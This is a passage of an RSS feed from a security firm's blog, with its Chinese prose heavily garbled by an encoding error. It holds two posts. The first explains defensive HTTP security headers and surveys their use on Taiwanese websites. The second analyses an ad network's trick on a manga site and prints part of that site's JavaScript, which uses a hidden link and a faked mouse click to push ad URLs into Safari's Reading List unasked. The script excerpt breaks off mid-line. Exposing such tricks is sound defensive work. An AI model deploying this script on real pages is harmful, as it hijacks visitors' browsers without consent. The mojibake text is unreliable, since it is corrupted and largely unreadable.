&lt;p&gt;å¦‚æœæœ‰ä¸€ç¨®æ–¹å¼å¯ä»¥å¢å¼·ç¶²ç«™çš„åŸºæœ¬å®‰å…¨æ€§ï¼Œè€Œä¸”ä¸éœ€è¦èŠ±å¤§éŒ¢ï¼Œåˆå¯ä»¥è®“é–‹ç™¼äººå“¡ä¸ç”¨å¤§å¹…åº¦è®Šæ›´ç¨‹å¼ï¼Œæ‡‰è©²æ˜¯å€‹çš†å¤§æ­¡å–œçš„æ–¹æ¡ˆï¼Ÿ&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;ç©¶ç«Ÿæœ‰æ²’æœ‰ä½æˆæœ¬çš„ç°¡æ˜“é˜²ç¦¦æ–¹æ³•&quot;&gt;ç©¶ç«Ÿæœ‰æ²’æœ‰ä½æˆæœ¬çš„ç°¡æ˜“é˜²ç¦¦æ–¹æ³•ï¼Ÿ&lt;/h3&gt;

&lt;p&gt;æœ‰çš„ï¼ç›®å‰å„å®¶ç€è¦½å™¨ (Google Chromeã€Firefoxã€Safariã€IE) å…¶å¯¦å·²ç¶“æ”¯æ´è¨±å¤šç¨®è³‡å®‰ç›¸é—œçš„ HTTP headersã€‚é–‹ç™¼äººå“¡è‹¥åœ¨ä¼ºæœå™¨è¨­å®šåŠ å…¥æŸäº› headersï¼Œç€è¦½å™¨æ”¶åˆ° response æ™‚å°±æœƒåŸ·è¡Œç›¸å°æ‡‰çš„é˜²ç¦¦æ©Ÿåˆ¶ï¼Œå¦‚æ­¤ä¸€ä¾†å¯ç›´æ¥æå‡ç¶²é æ‡‰ç”¨ç¨‹å¼çš„åŸºæœ¬å®‰å…¨æ€§ã€‚é€™äº› HTTP headers é€šå¸¸ä¹Ÿå·²è¢«è¨±å¤šå¸¸è¦‹çš„ framework ç´å…¥çˆ²åŸºæœ¬åŠŸèƒ½ï¼Œå³ä½¿é–‹ç™¼äººå“¡ä¸æ¸…æ¥šå¦‚ä½•ä¿®æ”¹ä¼ºæœå™¨ç›¸é—œè¨­å®šï¼Œä¹Ÿå¯ä»¥ä¾é  framework æä¾›çš„æ–¹å¼ä¾†ä½¿ç”¨é€™äº› headersã€‚å› æ­¤ä½¿ç”¨é€™äº› headers ä¾†æå‡ç¶²ç«™å®‰å…¨æ€§å°±æˆçˆ²é —å…· CP å€¼çš„æ–¹å¼ã€‚&lt;/p&gt;

&lt;p&gt;ç›®å‰æœ€å¸¸è¦‹çš„è³‡å®‰ç›¸é—œ HTTP headers å¯åƒè€ƒ &lt;a href=&quot;https://www.owasp.org/index.php/List_of_useful_HTTP_headers&quot;&gt;OWASP ç¶²ç«™&lt;/a&gt; æ‰€æ¢åˆ—çš„å…§å®¹ï¼š&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Content-Security-Policy (X-Content-Security-Policyã€X-Webkit-CSP éƒ½æ˜¯åŒä¸€ç³»åˆ—)&lt;/li&gt;
  &lt;li&gt;Strict-Transport-Security&lt;/li&gt;
  &lt;li&gt;X-Content-Type-Options&lt;/li&gt;
  &lt;li&gt;X-Frame-Options&lt;/li&gt;
  &lt;li&gt;X-XSS-Protection&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;é‚„æœ‰ä¸€äº›å…¶ä»–çš„è³‡å®‰ç›¸é—œ HTTP headers ä¹Ÿå€¼å¾—æ³¨æ„ï¼š&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Access-Control-Allow-Origin&lt;/li&gt;
  &lt;li&gt;X-Download-Options&lt;/li&gt;
  &lt;li&gt;X-Permitted-Cross-Domain-Policies&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;æœ€å¾Œæœ‰ä¸€é …æ¯”è¼ƒç‰¹åˆ¥çš„æ˜¯ Cookie çš„å®‰å…¨è¨­å®šï¼Œç”±æ–¼ Cookie ä¹Ÿæ˜¯ HTTP headers çš„ä¸€éƒ¨ä»½ï¼Œå› æ­¤æœ¬æ–‡ä¹Ÿå°‡å…¶åˆ—å‡ºï¼š&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Set-Cookie: HttpOnly&lt;/li&gt;
  &lt;li&gt;Set-Cookie: Secure&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ä¸Šè¿° headers çš„æ•¸é‡æ˜¯ä¸æ˜¯ç¨å¾®è¶…éä½ çš„æƒ³åƒï¼Ÿå…¶å¯¦é€™äº›æŠ€è¡“æ—©å·²è¢«å¾ˆå¤šå¤§å…¬å¸æ¡ç”¨ï¼Œåƒæ˜¯ Googleã€Facebookã€Twitter ç­‰å¸¸è¦‹çš„ç¶²è·¯æœå‹™éƒ½å¯çœ‹åˆ°é€™äº› headers çš„è¹¤å½±ã€‚ä¸‹é¢é€™å¼µåœ–ç‰‡ä½¿ç”¨ Chrome çš„ Inspector ä¾†è§€å¯Ÿ Twitter çš„ HTTP response å…§å®¹ï¼š&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140310/http-headers-twitter.jpg&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140310/http-headers-twitter.jpg&quot; alt=&quot;Twitter çš„ HTTP reponse&quot; title=&quot;Twitter çš„ HTTP reponse&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;å¾ç•«ç´…ç·šçš„éƒ¨åˆ†æˆ‘å€‘å¯çœ‹åˆ° Twitter åœ¨ Cookie è¨­å®šäº† Secure èˆ‡ HttpOnly é€™å…©å€‹å±¬æ€§ï¼Œä¸¦ä¸”æ¡ç”¨äº† Strict-Transport-Securityã€X-Content-Type-Optionsã€X-Frame-Optionsã€X-XSS-Protection é€™å¹¾ç¨® headersã€‚&lt;/p&gt;

&lt;p&gt;å¦‚æœè¦ºå¾—ç”¨åœ–å½¢ç•Œé¢å¤ªéº»ç…©ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ command line çš„å·¥å…·ä¾†è§€å¯Ÿã€‚ä¸‹é¢é€™å¼µåœ–ç‰‡ä½¿ç”¨ curl ä¾†è§€å¯Ÿ Facebook çš„ HTTP response å…§å®¹ï¼š&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140310/http-headers-facebook.jpg&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140310/http-headers-facebook.jpg&quot; alt=&quot;Facebook çš„ HTTP response&quot; title=&quot;Facebook çš„ HTTP response&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;ä¸Šè¿°è³‡å®‰ç›¸é—œçš„-headers-æƒ³è§£æ±ºå“ªäº›å•é¡Œ&quot;&gt;ä¸Šè¿°è³‡å®‰ç›¸é—œçš„ headers æƒ³è§£æ±ºå“ªäº›å•é¡Œï¼Ÿ&lt;/h3&gt;

&lt;p&gt;ç›®å‰é€™äº›è³‡å®‰ç›¸é—œçš„ HTTP headers æƒ³è§£æ±ºçš„å•é¡Œä¸»è¦å¯åˆ†ç‚ºä»¥ä¸‹äº”å¤§é¡ï¼š&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;é˜²ç¦¦ XSS (Cross Site Scripting)ï¼š
    &lt;ul&gt;
      &lt;li&gt;Content-Security-Policy&lt;/li&gt;
      &lt;li&gt;Set-Cookie: HttpOnly&lt;/li&gt;
      &lt;li&gt;X-XSS-Protection&lt;/li&gt;
      &lt;li&gt;X-Download-Options&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;é˜²ç¦¦ Clickjackingï¼š
    &lt;ul&gt;
      &lt;li&gt;X-Frame-Options&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;å¼·åŒ– HTTPS æ©Ÿåˆ¶ï¼š
    &lt;ul&gt;
      &lt;li&gt;Set-Cookie: Secure&lt;/li&gt;
      &lt;li&gt;Strict-Transport-Security&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;é¿å…ç€è¦½å™¨èª¤åˆ¤æ–‡ä»¶å½¢æ…‹ï¼š
    &lt;ul&gt;
      &lt;li&gt;X-Content-Type-Options&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;ä¿è­·ç¶²ç«™è³‡æºåˆ¥è¢«ä»»æ„å­˜å–ï¼š
    &lt;ul&gt;
      &lt;li&gt;Access-Control-Allow-Originï¼ˆæ­¤ header è‹¥è¨­å®šéŒ¯èª¤æœƒé©å¾—å…¶åï¼ï¼‰&lt;/li&gt;
      &lt;li&gt;X-Permitted-Cross-Domain-Policies&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;å…¶ä¸­ &lt;a href=&quot;https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)&quot;&gt;XSS&lt;/a&gt; èˆ‡ &lt;a href=&quot;https://www.owasp.org/index.php/Clickjacking&quot;&gt;Clickjacking&lt;/a&gt; æ˜¯ç›®å‰å¸¸è¦‹çš„æ”»æ“Šæ‰‹æ³•ï¼Œå°¤å…¶ XSS ç›®å‰ä»é«˜å±… &lt;a href=&quot;https://www.owasp.org/index.php/Top_10_2013-Top_10&quot;&gt;OWASP Top 10 2013 çš„ç¬¬ä¸‰å&lt;/a&gt;ï¼Œå…¶åš´é‡æ€§å¯è¦‹ä¸€æ–‘ã€‚è€Œåœ¨æˆ‘å€‘åŸ·è¡Œéçš„è¨±å¤š&lt;a href=&quot;http://devco.re/services/penetration-test&quot;&gt;æ»²é€æ¸¬è©¦&lt;/a&gt;æ¡ˆä¹‹ä¸­ï¼Œè¢«æˆ‘å€‘æ‰¾å‡º XSS å¼±é»çš„ç¶²ç«™é«˜é”ä¹æˆï¼å¯¦åœ¨æ˜¯ä¸èƒ½è¼•å¿½é€™äº›å•é¡Œã€‚è‹¥èƒ½é™ä½é€™äº›æ‰‹æ³•æ”»æ“ŠæˆåŠŸçš„æ©Ÿç‡ï¼Œä¼æ¥­çš„åˆ©ç›Šå°±èƒ½æœ‰æ›´å¤šçš„å®‰å…¨ä¿éšœï¼Œå®¢æˆ¶å°ä¼æ¥­çš„ä¿¡è³´äº¦æœƒæ›´åŠ ç©©å›ºã€‚&lt;/p&gt;

&lt;h3 id=&quot;ç›®å‰é€™äº›-headers-çš„ä½¿ç”¨ç‹€æ³&quot;&gt;ç›®å‰é€™äº› headers çš„ä½¿ç”¨ç‹€æ³ï¼Ÿ&lt;/h3&gt;

&lt;p&gt;é€™éº¼ç°¡ä¾¿çš„åŸºæœ¬é˜²ç¦¦æ–¹å¼ï¼Œç†ç•¶å»£ç‚ºä¼æ¥­æ‰€æ¡ç”¨ï¼Œå› æ­¤æˆ‘å€‘é‡å° &lt;a href=&quot;http://www.alexa.com/topsites/countries/TW&quot;&gt;Alexa Taiwan Top 525&lt;/a&gt; ä¸­æŒ‘å‡º 513 å€‹å¯æ­£å¸¸ä½¿ç”¨çš„ç¶²ç«™ï¼ˆå’¦ï¼Ÿä¸€èˆ¬ä¸æ˜¯ Top 500 å—ï¼Ÿæˆ‘æ²’é¨™ä½ ï¼Œ&lt;a href=&quot;http://www.alexa.com/topsites/countries;20/TW&quot;&gt;çœŸçš„æœ‰ 525&lt;/a&gt;ï¼‰ï¼Œèª¿æŸ¥é€™äº›ç¶²ç«™æ˜¯å¦ä½¿ç”¨æŸäº›å¸¸è¦‹çš„ HTTP headersã€‚çµæœç›¸ç•¶ä»¤äººå¤±æœ›ï¼Œè¨±å¤šç¶²ç«™éƒ½æœªæ¡ç”¨é€™äº› headersã€‚çµ±è¨ˆæ•¸æ“šå¦‚ä¸‹åœ–ï¼š&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140310/http-headers-statistic-alexa-taiwan.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140310/http-headers-statistic-alexa-taiwan.png&quot; alt=&quot;HTTP headers statistic of Alexa Taiwan Top 513&quot; title=&quot;HTTP headers statistic of Alexa Taiwan Top 513&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;å¾çµ±è¨ˆçµæœä¸­å¯ç™¼ç¾æœ€å¤šäººä½¿ç”¨çš„ HttpOnly åªæœ‰ 21.25%ï¼Œæ’åç¬¬äºŒçš„ X-Frame-Options ä¹Ÿåªæœ‰ 7.80%ã€‚è€Œä¸”é€™äº›æ•¸æ“šå°šæœªå°‡ Googleã€Twitter ç­‰å¤§å…¬å¸æ’é™¤ï¼Œè‹¥å°‡å‰è¿°åœ‹éš›å…¬å¸æ’é™¤å¾Œï¼Œé€™äº›æ¯”ç‡ææ€•æœƒæ›´ä½ã€‚&lt;/p&gt;

&lt;p&gt;ä¸éåœ¨ä¸Šè¿°ç¶²ç«™ä¸­æœ‰ä¸å°‘å…¥å£ç¶²ç«™ã€æ¼«ç•«ç¶²ç«™ã€è‰²æƒ…ç¶²ç«™ï¼Œæˆ–æ˜¯å…¬å¸ä¸¦éå°ç£ä¼æ¥­ï¼Œç„¡æ³•åæ‡‰å°ç£çš„ä½¿ç”¨ç‹€æ³ã€‚æ°å¥½åœ¨ 2012 å¹´ 10 æœˆå°ç£æœ‰è¨±å¤šç¶²è·¯æœå‹™å…¬å¸ä¸€åŒæˆç«‹äº† &lt;a href=&quot;http://www.tieataiwan.org/index.php&quot;&gt;TIEA å°ç£ç¶²è·¯æš¨é›»å­å•†å‹™ç”¢æ¥­ç™¼å±•å”æœƒ&lt;/a&gt;ï¼Œç›®å‰ç¶²ç«™ä¸Šçš„&lt;a href=&quot;http://www.tieataiwan.org/member.php&quot;&gt;æœƒå“¡åå–®&lt;/a&gt;ä¸­æœ‰ 116 å€‹æœƒå“¡ï¼Œå…¶ä¸­ä¸å°‘é —å…·ä»£è¡¨æ€§ï¼Œæ­£å¥½å¯è§€å¯Ÿé€™äº›å…¬å¸ç‡Ÿé‹çš„ç¶²ç«™æ˜¯å¦æœ‰æ¡ç”¨é€™äº› headersã€‚çµ±è¨ˆæ•¸æ“šå¦‚ä¸‹åœ–ï¼š&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140310/http-headers-statistic-tiea.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140310/http-headers-statistic-tiea.png&quot; alt=&quot;HTTP headers statistic of TIEA&quot; title=&quot;HTTP headers statistic of TIEA&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;å¾ˆå¯æƒœåœ°ï¼Œæ‰€æœ‰ headers çš„æ¡ç”¨ç‡æ¯”èµ·ä¸Šä¸€ä»½æ•¸æ“šéƒ½é‚„è¦ä½ã€‚é™¤éå…¬å¸ç¶²ç«™åƒ…ä½¿ç”¨éœæ…‹é é¢ï¼Œç¶²ç«™ä¸Šæ²’æœ‰ä»»ä½•å•†æ¥­é‚è¼¯ã€å¸³è™Ÿã€å€‹è³‡ï¼Œå¦å‰‡æ‡‰è©²éƒ½è¦ä½¿ç”¨åˆé©çš„ headers ç‚ºä½ çš„è³‡å®‰é˜²ç¦¦å·¥äº‹å¤šç¯‰ä¸€é“ç‰†ã€‚&lt;/p&gt;

&lt;p&gt;è€Œä¸”ç”±æ–¼ meeya ç›®å‰æ²’æœ‰æ­£å¼å®˜ç¶²ï¼Œæ˜¯ç›´æ¥ä½¿ç”¨ facebook ç²‰çµ²é ä½œç‚ºå®˜ç¶²ï¼Œå› æ­¤ Content-Security-Policyã€Set-Cookie Secureã€Strict-Transport-Securityã€X-Content-Type-Optionsã€X-Frame-Optionsã€X-XSS-Protection ç­‰å…­é … headers çš„çµ±è¨ˆæ•¸é‡éƒ½é‚„è¦å†æ¸›ä¸€ï¼Œé “æ™‚ Content-Security-Policy èˆ‡ Strict-Transport-Security çš„ç¸½æ•¸é‡çš†é™è‡³ 0 å€‹ã€‚æ­¤ç‹€æ³é¡¯ç¤ºå‡ºï¼Œå³ä½¿æ˜¯åœ¨ä¸€äº›å°ç£ä¸»æµçš„ç¶²ç«™ä¸­ï¼Œç›¸é—œç‡Ÿé‹äººå“¡åœ¨è³‡å®‰é ˜åŸŸä»æœ‰è¨±å¤šåŠªåŠ›èˆ‡å­¸ç¿’çš„ç©ºé–“ã€‚&lt;/p&gt;

&lt;p&gt;è¨±å¤šå°ç£ä¼æ¥­ç¶“å¸¸é¡§è‘—è¡æ¥­ç¸¾ã€é–‹ç™¼æ–°åŠŸèƒ½ã€è¶•è‘—è®“æ–°æœå‹™ä¸Šç·šï¼Œå»å¿½ç•¥äº†éå¸¸é‡è¦çš„åŸºç¤è³‡å®‰å»ºè¨­ï¼Œå¾€å¾€æ˜¯åœ¨é­åˆ°æ”»æ“Šå¾Œæ‰å¤§å‘¼æå¤±æ…˜é‡ï¼Œç”šè‡³æ˜¯å·²è¢«æ»²é€äº†è€Œä¸è‡ªçŸ¥ï¼Œå…¶ä¼æ¥­åˆ©ç›Šèˆ‡æ°‘çœ¾å€‹è³‡çš„ä¿éšœçš†ç›¸ç•¶ä»¤äººæ“”æ†‚ã€‚&lt;/p&gt;

&lt;h3 id=&quot;ä¸‹é›†é å‘Š&quot;&gt;ä¸‹é›†é å‘Š&lt;/h3&gt;

&lt;p&gt;æ¥ä¸‹ä¾†æœ¬æ–‡çš„çºŒä½œæˆ‘å€‘æœƒåˆ†å¹¾å€‹ç¯‡ç« è©³è«‡å„ç¨® headers çš„ä½¿ç”¨æ–¹å¼ä¸¦ä»‹ç´¹å¯¦éš›æ¡ˆä¾‹ï¼Œä¸‹ä¸€ç¯‡å°‡æœƒæ¢è¨å°ˆé–€é˜²ç¦¦ XSS çš„ HTTP headersï¼Œæ•¬è«‹æœŸå¾…ï¼ç­‰ä¸åŠçš„æœ‹å‹å€‘å°±è«‹å…ˆç”¨ä¸Šé¢çš„ä¸€äº›é—œéµå­—è‡ªè¡Œä¸Šç¶²æŸ¥è©¢å›‰ï¼&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2014/03/10/security-issues-of-http-headers-1/</link>
                <guid>https://devco.re/blog/2014/03/10/security-issues-of-http-headers-1</guid>
                <pubDate>Mon, 10 Mar 2014 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>å¥‡å„ªå»£å‘Š Qiyou å»£å‘Šæ‰‹æ³•å‰–æ</title>
                <description>&lt;p&gt;æ­¡è¿ä¾†åˆ°æˆ‘å€‘çš„æŠ€è¡“æ–‡ç« å°ˆæ¬„ï¼&lt;/p&gt;

&lt;p&gt;ä»Šå¤©æˆ‘å€‘ä¾†è«‡è«‡ã€Œå»£å‘Šé¡¯ç¤ºæ‰‹æ³•ã€ã€‚ä¸å°‘å»£å‘Šå•†ç‚ºäº†è¦å¢åŠ å»£å‘Šçš„æ›å…‰ä»¥åŠé»æ“Šç‡ï¼Œæœƒä½¿ç”¨å„ç¨®æ‰‹æ³•å¼·è¿«ä½¿ç”¨è€…é¡¯ç¤ºå»£å‘Šã€‚ä¾‹å¦‚å½ˆå‡ºå¼è¦–çª—ã€å…§åµŒå»£å‘Šã€å¼·åˆ¶è·³è½‰ç­‰ç­‰ã€‚ä½†é€™æ¨£çš„æ‰‹æ³•æœ‰ä»€éº¼å¥½æçš„å‘¢ï¼Ÿä»Šå¤©æœ‰ä¸€å€‹å¾ˆç‰¹åˆ¥çš„æ¡ˆä¾‹ï¼Œè®“æˆ‘å€‘ä¾†çœ‹çœ‹ä¸€å€‹ç¶²ç«™ã€Œ&lt;a href=&quot;http://1kkk.com&quot;&gt;1kkk.com æ¥µé€Ÿæ¼«ç•«&lt;/a&gt;ã€ã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20140306/blog_qiyou_hijack_02.png&quot; alt=&quot;å¥‡å„ªå»£å‘Š Qiyou å»£å‘Šæ‰‹æ³•å‰–æ - 1kkk.com&quot; title=&quot;å¥‡å„ªå»£å‘Š Qiyou å»£å‘Šæ‰‹æ³•å‰–æ - 1kkk.com&quot; /&gt;
é€™æ˜¯ä¸€å€‹å¸¸è¦‹çš„ç¶²è·¯æ¼«ç•«ç¶²ç«™ï¼Œæ¥è‘—é»æ“Šé€²å»æ¼«ç•«é é¢ã€‚
&lt;!-- more --&gt;
&lt;img src=&quot;/assets/img/blog/20140306/blog_qiyou_hijack_03.png&quot; alt=&quot;å¥‡å„ªå»£å‘Š Qiyou å»£å‘Šæ‰‹æ³•å‰–æ - 1kkk.com æ¼«ç•«é é¢&quot; title=&quot;å¥‡å„ªå»£å‘Š Qiyou å»£å‘Šæ‰‹æ³•å‰–æ - 1kkk.com æ¼«ç•«é é¢&quot; /&gt;
ç¶²ç«™ä¸­å……æ–¥è‘—ç…©äººçš„å»£å‘Šï¼Œä¸¦ä¸”çªç„¶ä¸€é–ƒè€Œé Safari çš„ã€Œé–±è®€åˆ—è¡¨ã€å‹•ç•«ã€‚æ€éº¼æœƒçªç„¶é€™æ¨£å‘¢ï¼Ÿè®“æˆ‘å€‘æ‰“é–‹ã€Œé–±è®€åˆ—è¡¨ã€ä¸€æ¢ç©¶ç«Ÿã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20140306/blog_qiyou_hijack_04.png&quot; alt=&quot;å¥‡å„ªå»£å‘Š Qiyou å»£å‘Šæ‰‹æ³•å‰–æ - Safari é¡¯ç¤ºé–±è®€å´é‚Šæ¬„&quot; title=&quot;å¥‡å„ªå»£å‘Š Qiyou å»£å‘Šæ‰‹æ³•å‰–æ - Safari é¡¯ç¤ºé–±è®€å´é‚Šæ¬„&quot; /&gt;
&lt;img src=&quot;/assets/img/blog/20140306/blog_qiyou_hijack_05.png&quot; alt=&quot;å¥‡å„ªå»£å‘Š Qiyou å»£å‘Šæ‰‹æ³•å‰–æ - Safari é–±è®€åˆ—è¡¨è¢«æ”¾ç½®å»£å‘Š URL&quot; title=&quot;å¥‡å„ªå»£å‘Š Qiyou å»£å‘Šæ‰‹æ³•å‰–æ - Safari é–±è®€åˆ—è¡¨è¢«æ”¾ç½®å»£å‘Š URL&quot; /&gt;&lt;/p&gt;

&lt;p&gt;æ‰“é–‹é–±è®€åˆ—è¡¨ä¹‹å¾Œï¼Œæˆ‘å€‘èµ«ç„¶ç™¼ç¾è£¡é¢è¢«åŠ äº†éå¸¸å¤šå»£å‘Šçš„é é¢ï¼&lt;/p&gt;

&lt;p&gt;å¯ä»¥çœ‹ä»¥ä¸‹å½±ç‰‡ç¤ºç¯„ï¼š&lt;/p&gt;
&lt;center&gt;&lt;div class=&quot;videowrapper&quot;&gt;&lt;iframe width=&quot;560&quot; height=&quot;420&quot; src=&quot;https://www.youtube.com/embed/E-BGf1MwecU&quot; frameborder=&quot;0&quot;&gt; &lt;/iframe&gt;&lt;/div&gt;&lt;/center&gt;

&lt;p&gt;é€™æ˜¯æ€éº¼åšåˆ°çš„å‘¢ï¼Ÿå°±æ˜¯ä¸€ç¨®åˆ©ç”¨ JavaScript æ§åˆ¶æ»‘é¼ é»æ“Šçš„è®Šå½¢æ‡‰ç”¨ã€‚é»é¸ã€Œç¶²é æª¢é–±å™¨ã€æˆ–æ˜¯ã€Œé–‹ç™¼è€…å·¥å…·ã€ï¼Œæœƒçœ‹åˆ°ä¸€æ®µå¥‡æ€ªçš„ JavaScript æ§åˆ¶æ»‘é¼ çš„é»æ“Šè¡Œç‚ºã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20140306/blog_qiyou_hijack_06.png&quot; alt=&quot;å¥‡å„ªå»£å‘Š Qiyou å»£å‘Šæ‰‹æ³•å‰–æ - å»£å‘Š JavaScript&quot; title=&quot;å¥‡å„ªå»£å‘Š Qiyou å»£å‘Šæ‰‹æ³•å‰–æ - å»£å‘Š JavaScript&quot; /&gt;&lt;/p&gt;

&lt;p&gt;åˆ†æç¯€éŒ„å¾Œçš„ code å¦‚ä¸‹ï¼š&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;!DOCTYPE html&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;head&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;force_add_url_to_readinglist&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;target_url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;fake_element&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;createElement&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;fake_element&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;setAttribute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;href&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;target_url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;fake_element&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;setAttribute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;style&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;display:none;&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

        &lt;span class=&quot;c1&quot;&gt;// https://developer.mozilla.org/en-US/docs/Web/API/event.initMouseEvent&lt;/span&gt;
        &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;fake_event&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;createEvent&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;MouseEvents&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;fake_event&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;initMouseEvent&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;click&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;window&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span 